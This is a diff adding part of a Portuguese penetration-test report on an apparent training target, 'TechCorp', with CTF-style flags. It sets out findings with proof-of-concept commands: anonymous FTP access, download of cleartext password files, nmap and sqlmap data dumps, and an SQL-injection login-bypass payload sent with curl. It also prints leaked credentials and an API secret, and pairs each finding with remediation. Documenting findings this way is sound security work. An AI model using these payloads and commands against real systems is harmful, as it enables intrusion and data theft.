+   +-------------------------------------------------------------------------+
+</div></code></pre>
+    <h3 id="falha-03-permissão-de-login-anônimo-ativo-no-servidor-ftp-porta-21">
+      FALHA 03: Permissão de Login Anônimo Ativo no Servidor FTP (Porta 21)
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F03</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N —
+        Score: <strong>7.5</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> FTP Protocol (21/TCP) / Mecanismo de
+        Autenticação Inseguro
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-287 (Improper Authentication), OWASP
+        Top 10 A07:2021 (Identification and Authentication Failures)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-2">Descrição Técnica</h4>
+    <p>
+      O daemon de FTP (<code>vsftpd 3.0.5</code>) em execução na porta 21/TCP
+      estava configurado para aceitar credenciais anônimas (<code
+        >anonymous:anonymous</code
+      >
+      ou código FTP 230), garantindo acesso irrestrito ao sistema de arquivos do
+      diretório compartilhado sem demandar identificação prévia.
+    </p>
+    <h4 id="prova-de-conceito-poc-2">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Execução do script NSE de enumeração no Nmap:</li>
+    </ol>
+    <pre class="hljs"><code><div>nmap -p 21 --script ftp-anon 98.95.207.28
+</div></code></pre>
+    <ol start="2">
+      <li>Registro de execução:</li>
+    </ol>
+    <pre class="hljs"><code><div>PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#x27;t get directory listing: PASV IP 172.20.0.20 is not the same as 98.95.207.28
+</div></code></pre>
+    <ol start="3">
+      <li>Autenticação manual via cliente FTP:</li>
+    </ol>
+    <pre class="hljs"><code><div>ftp -n 98.95.207.28
+user anonymous anonymous
+230 Login successful.
+Remote system <span class="hljs-built_in">type</span> is UNIX.
+Using binary mode to transfer files.
+</div></code></pre>
+    <h4 id="impactos-2">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Acesso não autenticado a arquivos
+        mantidos no servidor de arquivos.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Violação do princípio do menor
+        privilégio e perda de rastreabilidade de acessos a dados corporativos.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-2">Remediação Técnica</h4>
+    <p>
+      Desabilitar o acesso anônimo no arquivo de configuração principal do
+      serviço vsftpd.
+    </p>
+    <p>
+      <em>Arquivo <code>/etc/vsftpd.conf</code>:</em>
+    </p>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-comment"># Desabilita login anônimo</span>
+<span class="hljs-attr">anonymous_enable</span>=<span class="hljs-literal">NO</span>
+
+<span class="hljs-comment"># Permite apenas usuários locais autorizados</span>
+<span class="hljs-attr">local_enable</span>=<span class="hljs-literal">YES</span>
+<span class="hljs-attr">write_enable</span>=<span class="hljs-literal">YES</span>
+<span class="hljs-attr">chroot_local_user</span>=<span class="hljs-literal">YES</span>
+</div></code></pre>
+    <p>Reinicialização do serviço:</p>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-built_in">sudo</span> systemctl restart vsftpd
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f03_ftp_anon_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f03_ftp_exploitation.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_network_f03.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3 id="falha-04-exposição-do-arquivo-userconf-em-texto-claro-no-ftp">
+      FALHA 04: Exposição do Arquivo <code>user.conf</code> em Texto Claro no
+      FTP
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F04</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N —
+        Score: <strong>7.5</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> Transferência de Arquivos FTP /
+        Vazamento de Informações
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-312 (Cleartext Storage of Sensitive
+        Information), OWASP Top 10 A01:2021 (Broken Access Control)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-3">Descrição Técnica</h4>
+    <p>
+      No compartilhamento do servidor FTP acessível publicamente, encontrava-se
+      armazenado o arquivo <code>user.conf</code>. O arquivo continha o
+      mapeamento de contas de usuários válidos do sistema e suas respectivas
+      parametrizações de perfil, permitindo a enumeração de contas para ataques
+      de força bruta direcionados.
+    </p>
+    <h4 id="prova-de-conceito-poc-3">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Conexão e download do arquivo via FTP interativo:</li>
+    </ol>
+    <pre class="hljs"><code><div>ftp&gt; passive
+ftp&gt; <span class="hljs-built_in">ls</span> -la
+-rw-r--r--    1 1000     1000          452 Nov 26 17:50 user.conf
+ftp&gt; get user.conf
+226 Transfer complete.
+</div></code></pre>
+    <ol start="2">
+      <li>Inspeção do conteúdo obtido:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-section">[system_users]</span>
+<span class="hljs-attr">admin_user</span>=techcorp
+<span class="hljs-attr">backup_user</span>=backup_admin
+<span class="hljs-attr">db_user</span>=techcorp_user
+<span class="hljs-attr">developer</span>=gilson
+<span class="hljs-attr">superadmin</span>=cl4ud1o
+</div></code></pre>
+    <h4 id="impactos-3">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Fornecimento de nomes de usuários
+        reais para exploração de serviços como SSH e painéis administrativos
+        web.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Aumento substancial da eficácia de
+        ataques de personificação de identidade e força bruta.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-3">Remediação Técnica</h4>
+    <p>
+      Remover arquivos de configuração de diretórios com permissão de leitura
+      genérica e restringir o acesso apenas a identidades de serviço
+      autenticadas.
+    </p>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-built_in">chmod</span> 600 /etc/vsftpd/user.conf
+<span class="hljs-built_in">chown</span> root:root /etc/vsftpd/user.conf
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f04_user_conf_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f04_config_leak.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_network_f04.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3
+      id="falha-05-exposição-de-lista-de-credenciais-brutas-passwordstxt-sem-cifragem"
+    >
+      FALHA 05: Exposição de Lista de Credenciais Brutas
+      (<code>passwords.txt</code>) sem Cifragem
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F05</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N —
+        Score: <strong>7.5</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> Transferência de Arquivos FTP /
+        Vazamento de Credenciais
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-256 (Unprotected Storage of
+        Credentials), OWASP Top 10 A02:2021 (Cryptographic Failures)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-4">Descrição Técnica</h4>
+    <p>
+      Constatou-se a presença do arquivo <code>passwords.txt</code> na estrutura
+      acessível via FTP. O arquivo reunia credenciais corporativas armazenadas
+      sem nenhum algoritmo de dispersão (hashing) ou cifragem, prontas para uso
+      operacional em outros pontos da infraestrutura.
+    </p>
+    <h4 id="prova-de-conceito-poc-4">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Download e leitura do arquivo através do console FTP:</li>
+    </ol>
+    <pre class="hljs"><code><div>ftp&gt; get passwords.txt
+226 Transfer complete.
+ftp&gt; quit
+$ <span class="hljs-built_in">cat</span> passwords.txt
+</div></code></pre>
+    <ol start="2">
+      <li>Conteúdo exposto:</li>
+    </ol>
+    <pre class="hljs"><code><div>admin:admin123
+techcorp_user:T3chC0rp_S3cr3t_2024!
+superadmin:Sup3r@dm1n!2024#Secure
+techcorp:password123
+</div></code></pre>
+    <h4 id="impactos-4">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Comprometimento imediato de
+        credenciais centrais do banco de dados e do sistema operacional.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Risco severo de apropriação
+        indevida de contas e perda de confidencialidade da infraestrutura
+        interna.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-4">Remediação Técnica</h4>
+    <ol>
+      <li>Deletar imediatamente o arquivo do diretório de transferência.</li>
+      <li>Forçar a redefinição de todas as credenciais expostas.</li>
+      <li>
+        Adotar cofres de senhas corporativos (ex: HashiCorp Vault, AWS Secrets
+        Manager) para o ciclo de vida de senhas.
+      </li>
+    </ol>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f05_passwords_leak_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f05_passwords_dump.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_network_f05.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <pre
+      class="hljs"
+    ><code><div>   +-------------------------------------------------------------------------+
+   |            FASE 3: EXPLORAÇÃO WEB E BANCO DE DADOS                      |
+   +-------------------------------------------------------------------------+
+</div></code></pre>
+    <h3
+      id="falha-06-exposição-pública-de-arquivo-de-conexão-com-o-banco-databasephptxt"
+    >
+      FALHA 06: Exposição Pública de Arquivo de Conexão com o Banco
+      (<code>database.php.txt</code>)
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F06</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N —
+        Score: <strong>8.6</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> HTTP / Descuido Operacional de Backup
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-538 (File and Directory Information
+        Exposure), OWASP Top 10 A05:2021 (Security Misconfiguration)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-5">Descrição Técnica</h4>
+    <p>
+      Identificou-se no diretório <code>/config/</code> a presença do arquivo
+      <code>database.php.txt</code>. Ao salvar arquivos PHP com a extensão
+      <code>.txt</code> para fins de contingência ou backup temporário, o
+      interpretador Apache entrega o conteúdo como texto puro
+      (<code>text/plain</code>), desativando o processamento do PHP e expondo o
+      código com as credenciais de banco hardcoded.
+    </p>
+    <h4 id="prova-de-conceito-poc-5">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Requisição HTTP direta ao recurso:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s <span class="hljs-string">&quot;http://98.95.207.28/config/database.php.txt&quot;</span>
+</div></code></pre>
+    <ol start="2">
+      <li>Retorno do servidor com as credenciais de produção:</li>
+    </ol>
+    <pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;
+<span class="hljs-variable">$db_name</span> = <span class="hljs-string">&quot;techcorp_db&quot;</span>;
+<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;techcorp_user&quot;</span>;
+<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;T3chC0rp_S3cr3t_2024!&quot;</span>;
+
+<span class="hljs-keyword">try</span> {
+    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$host</span>;dbname=<span class="hljs-subst">$db_name</span>&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);
+    <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);
+} <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Connection error: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();
+}
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+    <h4 id="impactos-5">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Concessão de credenciais com
+        permissões completas de manipulação sobre o schema
+        <code>techcorp_db</code>.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Risco direto de vazamento massivo
+        de dados de clientes e violação das diretrizes da LGPD.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-5">Remediação Técnica</h4>
+    <ol>
+      <li>
+        Proibir a criação de arquivos de backup com extensões não executáveis no
+        DocumentRoot.
+      </li>
+      <li>
+        Injetar credenciais através de variáveis de ambiente do sistema
+        operacional.
+      </li>
+    </ol>
+    <p><em>Exemplo de implementação segura em PHP PDO:</em></p>
+    <pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;DB_HOST&#x27;</span>) ?: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;
+<span class="hljs-variable">$db</span>   = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>) ?: <span class="hljs-string">&#x27;techcorp_db&#x27;</span>;
+<span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;DB_USER&#x27;</span>);
+<span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;DB_PASS&#x27;</span>);
+
+<span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$host</span>;dbname=<span class="hljs-subst">$db</span>;charset=utf8mb4&quot;</span>;
+<span class="hljs-variable">$options</span> = [
+    PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>            =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>,
+    PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span> =&gt; PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>,
+    PDO::<span class="hljs-variable constant_">ATTR_EMULATE_PREPARES</span>   =&gt; <span class="hljs-literal">false</span>,
+];
+
+<span class="hljs-keyword">try</span> {
+     <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>, <span class="hljs-variable">$options</span>);
+} <span class="hljs-keyword">catch</span> (\PDOException <span class="hljs-variable">$e</span>) {
+     <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;Database connection failure: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());
+     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Erro interno de conexão.&quot;</span>);
+}
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f06_db_leak_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f06_db_source.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>: <code>slides/module_web_f06.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3 id="falha-07-descoberta-de-views-ocultas-via-injeção-de-sql-sqli">
+      FALHA 07: Descoberta de Views Ocultas via Injeção de SQL (SQLi)
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F07</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N —
+        Score: <strong>7.5</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> HTTP POST / Injeção SQL na camada de
+        consulta
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-89 (SQL Injection), OWASP WSTG-INPV-05
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-6">Descrição Técnica</h4>
+    <p>
+      A aplicação web no endpoint <code>login.php</code> processava o parâmetro
+      <code>username</code> sem a devida sanitização ou uso de instruções
+      parametrizadas. Isso viabilizou ataques de Injeção de SQL baseados em
+      UNION e Time-Based Blind, possibilitando a leitura de tabelas do metadado
+      <code>information_schema</code> e a descoberta da view
+      <code>sensitive_info</code>.
+    </p>
+    <h4 id="prova-de-conceito-poc-6">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>
+        Execução do sqlmap para extração de views e metadados estruturais:
+      </li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>sqlmap -u <span class="hljs-string">&quot;http://98.95.207.28/login.php&quot;</span> \
+       --data=<span class="hljs-string">&quot;username=test&amp;password=test&quot;</span> \
+       -D information_schema -T VIEWS --dump --batch
+</div></code></pre>
+    <ol start="2">
+      <li>
+        Registro de extração contendo a definição da view e a flag oculta:
+      </li>
+    </ol>
+    <pre class="hljs"><code><div>Database: information_schema
+Table: VIEWS
+[1 entry]
++--------------+----------------+----------------------------------------------------------------------------------------------------+
+| TABLE_SCHEMA | TABLE_NAME     | VIEW_DEFINITION                                                                                    |
++--------------+----------------+----------------------------------------------------------------------------------------------------+
+| techcorp_db  | sensitive_info | select `u`.`username` AS `username`,`u`.`password` AS `password`,`u`.`role` AS `role`,             |
+|              |                | &#x27;FLAG{v13w_d1sc0v3ry_4dv4nc3d}&#x27; AS `hidden_flag` from `techcorp_db`.`users` `u` where `role`=&#x27;admin&#x27;|
++--------------+----------------+----------------------------------------------------------------------------------------------------+
+</div></code></pre>
+    <h4 id="impactos-6">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Revelação da lógica de negócios
+        interna, mapeamento de views restritas e extração de chaves.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Quebra completa dos mecanismos de
+        isolamento lógico do banco de dados relacional.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-6">Remediação Técnica</h4>
+    <p>
+      Substituir todas as consultas concatenadas por Declarações Preparadas (<em
+        >Prepared Statements</em
+      >) com amarração estrita de tipos (<em>Type Binding</em>).
+    </p>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f07_view_sqli_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f07_sqlmap_views.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>: <code>slides/module_web_f07.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3
+      id="falha-08-extração-completa-de-registros-críticos-data-dump-via-sqli"
+    >
+      FALHA 08: Extração Completa de Registros Críticos (Data Dump via SQLi)
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F08</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N —
+        Score: <strong>8.2</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> HTTP POST / SQL Injection UNION Based
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-89 (SQL Injection), OWASP Top 10
+        A03:2021 (Injection)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-7">Descrição Técnica</h4>
+    <p>
+      A partir do vetor de injeção confirmado no parâmetro
+      <code>username</code>, realizou-se a exfiltração integral das tabelas
+      <code>users</code>, <code>clients</code>, <code>contacts</code> e
+      <code>secret_data</code> do schema <code>techcorp_db</code>, obtendo
+      segredos de integração, registros de clientes e hashes de autenticação.
+    </p>
+    <h4 id="prova-de-conceito-poc-7">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>
+        Extração dos registros confidenciais da tabela <code>secret_data</code>:
+      </li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>sqlmap -u <span class="hljs-string">&quot;http://98.95.207.28/login.php&quot;</span> \
+       --data=<span class="hljs-string">&quot;username=test&amp;password=test&quot;</span> \
+       -D techcorp_db -T secret_data --dump --batch
+</div></code></pre>
+    <ol start="2">
+      <li>Registros extraídos do banco de dados de produção:</li>
+    </ol>
+    <pre class="hljs"><code><div>Database: techcorp_db
+Table: secret_data
+[4 entries]
++----+---------------------+---------------+----------------------------------------------+
+| id | created_at          | secret_key    | secret_value                                 |
++----+---------------------+---------------+----------------------------------------------+
+| 1  | 2025-11-17 14:30:36 | database_flag | FLAG{sql_1nj3ct10n_m4st3r}                   |
+| 2  | 2025-11-17 14:30:36 | admin_token   | FLAG{h1dd3n_d4t4_1n_d4t4b4s3}                |
+| 3  | 2025-11-17 14:30:36 | api_secret    | sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG       |
+| 4  | 2025-11-17 14:30:36 | backup_path   | /var/backups/techcorp/backup_20240115.tar.gz |
++----+---------------------+---------------+----------------------------------------------+
+</div></code></pre>
+    <h4 id="impactos-7">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Comprometimento integral da
+        integridade e confidencialidade dos dados corporativos.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Notificação compulsória de
+        vazamento à ANPD, danos à reputação e vazamento de segredos industriais
+        de API.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-7">Remediação Técnica</h4>
+    <p>
+      Implementar a validação e parametrização estrita de dados na camada de
+      modelo da aplicação:
+    </p>
+    <pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">// Consulta segura usando Prepared Statements</span>
+<span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;SELECT id, password, role FROM users WHERE username = :username LIMIT 1&#x27;</span>);
+<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$input_user</span>]);
+<span class="hljs-variable">$userData</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f08_data_dump_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f08_sqli_dump.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>: <code>slides/module_web_f08.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3 id="falha-09-bypass-de-autenticação-administrativa-via-injeção-de-sql">
+      FALHA 09: Bypass de Autenticação Administrativa via Injeção de SQL
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F09</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>CRÍTICO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H —
+        Score: <strong>9.8</strong>)
+      </li>
+      <li><strong>Vetor de Ataque:</strong> HTTP POST Authentication Bypass</li>
+      <li>
+        <strong>Referências:</strong> CWE-89 (SQL Injection), CWE-287 (Improper
+        Authentication)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-8">Descrição Técnica</h4>
+    <p>
+      A rotina de autenticação do formulário <code>/login.php</code> validava as
+      credenciais através de uma query SQL direta construída por concatenação de
+      strings:
+    </p>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">$username</span>&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;
+</div></code></pre>
+    <p>
+      Ao injetar o payload booleano <code>admin' OR '1'='1' -- -</code>, a
+      condição lógica da consulta tornou-se tautológica, retornando o primeiro
+      registro da tabela (usuário <code>admin</code>, ID 1) e criando uma sessão
+      administrativa ativa sem exigir a senha correta.
+    </p>
+    <h4 id="prova-de-conceito-poc-8">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Submissão do payload de bypass de autenticação:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -i -s -X POST <span class="hljs-string">&quot;http://98.95.207.28/login.php&quot;</span> \
+     -d <span class="hljs-string">&quot;username=admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;-- -&amp;password=any&quot;</span>
+</div></code></pre>
+    <ol start="2">
+      <li>
+        Resposta com redirecionamento HTTP 302 e emissão de cookie de sessão
+        administrativa:
+      </li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">302</span> Found
+<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Wed, 27 Nov 2025 20:58:07 GMT
+<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache/2.4.54 (Debian)
+<span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=342cc1b2922ef4cd5210ccf; path=/; HttpOnly
+<span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>dashboard.php
+
+<span class="language-avrasm">Login efetuado <span class="hljs-keyword">com</span> sucesso. Redirecionando...
+</span></div></code></pre>
+    <h4 id="impactos-8">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Acesso integral e não autorizado ao
+        painel restrito com perfil de administrador.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Descaracterização do controle de
+        acesso, permitindo a usuários não autorizados visualizar dados
+        operacionais protegidos.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-8">Remediação Técnica</h4>
+    <p>
+      Adotar verificação segura com <code>password_verify()</code> e consultas
+      parametrizadas:
+    </p>
+    <pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT id, username, password, role FROM users WHERE username = :user&quot;</span>);
+<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">&#x27;user&#x27;</span> =&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]]);
+<span class="hljs-variable">$user</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);
+
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> &amp;&amp; <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) {
+    <span class="hljs-title function_ invoke__">session_regenerate_id</span>(<span class="hljs-literal">true</span>);
+    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] = <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
+    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;role&#x27;</span>];
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /dashboard.php&#x27;</span>);
+    <span class="hljs-keyword">exit</span>;
+} <span class="hljs-keyword">else</span> {
+    <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Credenciais inválidas.&quot;</span>;
+}
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f09_auth_bypass_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f09_login_sqli.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>: <code>slides/module_web_f09.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
